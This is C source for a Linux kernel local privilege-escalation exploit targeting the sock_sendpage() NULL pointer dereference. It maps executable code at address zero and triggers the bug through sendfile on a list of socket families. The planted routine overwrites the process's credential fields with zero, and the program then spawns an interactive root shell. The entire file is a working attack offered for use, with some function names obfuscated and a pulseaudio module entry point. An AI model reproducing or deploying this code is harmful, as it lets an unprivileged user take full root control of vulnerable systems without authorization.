/*
 *  Linux sock_sendpage() NULL pointer dereference
 *  Copyright 2009 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301
 * USA
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/personality.h>
#include <sys/sendfile.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#if !defined(__always_inline)
#define __always_inline inline __attribute__((always_inline))
#endif

#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
static __always_inline unsigned long KuzbwjQBGd(void) {
  unsigned long sp;

  asm volatile("movq %%rsp,%0" : "=r"(sp));

  return sp;
}

#else
static __always_inline unsigned long KuzbwjQBGd(void) {
  unsigned long sp;

  asm volatile("movl %%esp,%0" : "=r"(sp));

  return sp;
}

#endif

#elif defined(__powerpc__) || defined(__powerpc64__)
static __always_inline unsigned long KuzbwjQBGd(void) {
  unsigned long sp;

  asm volatile("mr %0,%%r1" : "=r"(sp));

  return sp;
}

/*
 * The TOC section is accessed via the dedicated TOC pointer register, r2.
 */
static __always_inline unsigned long JITKNXtgSu(void) {
  unsigned long toc_pointer;

  asm volatile("mr %0,%%r2" : "=r"(toc_pointer));

  return toc_pointer;
}

#endif

#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
static __always_inline unsigned long xiHIsUEZJB(void) {
  unsigned long task_struct;

  asm volatile("movq %%gs:(0),%0" : "=r"(task_struct));

  return task_struct;
}

#else
#define TASK_RUNNING 0

static __always_inline unsigned long xiHIsUEZJB(void) {
  unsigned long task_struct, thread_info;

  thread_info = KuzbwjQBGd() & ~(4096 - 1);

  if (*(unsigned long *)thread_info >= 0xc0000000) {
    task_struct = *(unsigned long *)thread_info;

    /*
     * The TASK_RUNNING is the only possible state for a process executing
     * in user-space.
     */
    if (*(unsigned long *)task_struct == TASK_RUNNING)
      return task_struct;
  }

  /*
   * Prior to the 2.6 kernel series, the task_struct was stored at the end
   * of the kernel stack.
   */
  task_struct = KuzbwjQBGd() & ~(8192 - 1);

  if (*(unsigned long *)task_struct == TASK_RUNNING)
    return task_struct;

  thread_info = task_struct;

  task_struct = *(unsigned long *)thread_info;

  if (*(unsigned long *)task_struct == TASK_RUNNING)
    return task_struct;

  return 0;
}

#endif

#elif defined(__powerpc__) || defined(__powerpc64__)
#if defined(__LP64__)
#define THREAD_SIZE 16384
#else
#define THREAD_SIZE 8192
#endif

#define TASK_RUNNING 0

static __always_inline unsigned long xiHIsUEZJB(void) {
  unsigned long task_struct, thread_info;

  task_struct = KuzbwjQBGd() & ~(THREAD_SIZE - 1);

  if (*(unsigned long *)task_struct == TASK_RUNNING)
    return task_struct;

  thread_info = task_struct;

  task_struct = *(unsigned long *)thread_info;

  if (*(unsigned long *)task_struct == TASK_RUNNING)
    return task_struct;

  return 0;
}

#endif

static unsigned long uid, gid;

static __always_inline void change_cow_cred(void) {
  char *task_struct;
  int i;
  unsigned int *real_cred, *cred;

  task_struct = (char *)xiHIsUEZJB();

  real_cred = NULL;
  cred = NULL;

  for (i = 0; i < 4096; i++) {
    if (!strcmp(task_struct, "exploit") || !strcmp(task_struct, "pulseaudio")) {
      /*
       * Search for unlocked count in cred_exec_mutex.
       */
      for (i = 0; i < 256; i++) {
        if (*(unsigned int *)task_struct == 1) {
          real_cred = *((unsigned int **)task_struct - 3);
          cred = *((unsigned int **)task_struct - 2);
          break;
        }

        task_struct--;
      }

      break;
    }

    task_struct++;
  }

  if (real_cred)
    for (i = 0; i < 16; i++) {
      if (real_cred[0] == uid && real_cred[1] == uid && real_cred[2] == uid &&
          real_cred[3] == uid && real_cred[4] == gid && real_cred[5] == gid &&
          real_cred[6] == gid && real_cred[7] == gid) {
        real_cred[0] = real_cred[1] = real_cred[2] = real_cred[3] =
            real_cred[4] = real_cred[5] = real_cred[6] = real_cred[7] = 0;
        break;
      }

      real_cred++;
    }

  if (cred)
    for (i = 0; i < 16; i++) {
      if (cred[0] == uid && cred[1] == uid && cred[2] == uid &&
          cred[3] == uid && cred[4] == gid && cred[5] == gid &&
          cred[6] == gid && cred[7] == gid) {
        cred[0] = cred[1] = cred[2] = cred[3] = cred[4] = cred[5] = cred[6] =
            cred[7] = 0;
        break;
      }

      cred++;
    }
}

static int change_cred(void) {
  unsigned int *task_struct;
  int i;

  task_struct = (unsigned int *)xiHIsUEZJB();

  if (task_struct) {
    for (i = 0; i < 4096; i++) {
      if (task_struct[0] == uid && task_struct[1] == uid &&
          task_struct[2] == uid && task_struct[3] == uid &&
          task_struct[4] == gid && task_struct[5] == gid &&
          task_struct[6] == gid && task_struct[7] == gid) {
        task_struct[0] = task_struct[1] = task_struct[2] = task_struct[3] =
            task_struct[4] = task_struct[5] = task_struct[6] = task_struct[7] =
                0;
        return -1;
      }

      task_struct++;
    }

    change_cow_cred();
  }

  return -1;
}

#if !defined(IPPROTO_SCTP)
#define IPPROTO_SCTP 132
#endif

#if !defined(PF_IUCV)
#define PF_IUCV 32
#endif

#if !defined(PF_ISDN)
#define PF_ISDN 34
#endif

int s[][3] = {{PF_AX25, SOCK_DGRAM, IPPROTO_IP},
              {PF_IPX, SOCK_DGRAM, IPPROTO_IP},
              {PF_APPLETALK, SOCK_DGRAM, IPPROTO_IP},
              {PF_X25, SOCK_DGRAM, IPPROTO_IP},
              {PF_INET6, SOCK_SEQPACKET, IPPROTO_SCTP},
              {PF_IRDA, SOCK_DGRAM, IPPROTO_IP},
              {PF_PPPOX, SOCK_DGRAM, IPPROTO_IP},
              {PF_BLUETOOTH, SOCK_DGRAM, IPPROTO_IP},
              {PF_IUCV, SOCK_STREAM, IPPROTO_IP},
              {PF_ISDN, SOCK_DGRAM, IPPROTO_IP},
              {PF_MAX, 0, 0}};

#define PAGE_SIZE getpagesize()

int pa__init(void *m) {
  char *addr;
  int i, out_fd, in_fd;
  char template[] = "/tmp/tmp.XXXXXX";

  uid = getuid(), gid = getgid();

  if ((addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE,
                   MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, 0, 0)) ==
      MAP_FAILED) {
    perror("mmap");

    if (personality(0xffffffff) == PER_SVR4)
      if (mprotect(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == -1)
        perror("mprotect");

    exit(EXIT_FAILURE);
  }

#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
  addr[0] = '\xff';
  addr[1] = '\x24';
  addr[2] = '\x25';
  *(unsigned long *)&addr[3] = 8;
  *(unsigned long *)&addr[8] = (unsigned long)change_cred;

#else
  addr[0] = '\xff';
  addr[1] = '\x25';
  *(unsigned long *)&addr[2] = 8;
  *(unsigned long *)&addr[8] = (unsigned long)change_cred;

#endif

#elif defined(__powerpc__) || defined(__powerpc64__)
#if defined(__LP64__)
  /*
   * The 64-bit PowerPC ELF ABI defines function descriptors. A function
   * descriptor is a three doubleword data structure that contains the
   * following values:
   *
   *  * The first doubleword contains the address of the entry point of the
   *    function.
   *  * The second doubleword contains the TOC base address for the function
   *  * The third doubleword contains the environment pointer for languages
   *    such as Pascal and PL/1.
   */
  *(unsigned long *)&addr[0] = *(unsigned long *)change_cred;
  *(unsigned long *)&addr[8] = JITKNXtgSu();
  *(unsigned long *)&addr[16] = 0;

#else
  addr[0] = '\x3f';
  addr[1] = '\xe0';
  *(unsigned short *)&addr[2] = (unsigned short)change_cred >> 16;
  addr[4] = '\x63';
  addr[5] = '\xff';
  *(unsigned short *)&addr[6] = (unsigned short)change_cred;
  addr[8] = '\x7f';
  addr[9] = '\xe9';
  addr[10] = '\x03';
  addr[11] = '\xa6';
  addr[12] = '\x4e';
  addr[13] = '\x80';
  addr[14] = '\x04';
  addr[15] = '\x20';

#endif

#endif

  if ((in_fd = mkstemp(template)) == -1) {
    perror("mkstemp");
    exit(EXIT_FAILURE);
  }

  if (unlink(template) == -1) {
    perror("unlink");
    exit(EXIT_FAILURE);
  }

  if (ftruncate(in_fd, PAGE_SIZE) == -1) {
    perror("ftruncate");
    exit(EXIT_FAILURE);
  }

  i = 0;

exploit:
  if (s[i][0] == PF_MAX)
    exit(EXIT_FAILURE);

  if ((out_fd = socket(s[i][0], s[i][1], s[i][2])) == -1) {
    perror("socket");
    i++;
    goto exploit;
  }

  sendfile(out_fd, in_fd, NULL, PAGE_SIZE);

  if (getuid() || getgid()) {
    close(out_fd);
    i++;
    goto exploit;
  }

  execl("/bin/sh", "sh", "-i", NULL);

  exit(EXIT_SUCCESS);
}

void pa__done(void *m) {}

int main(void) {
  pa__init(NULL);

  exit(EXIT_SUCCESS);
}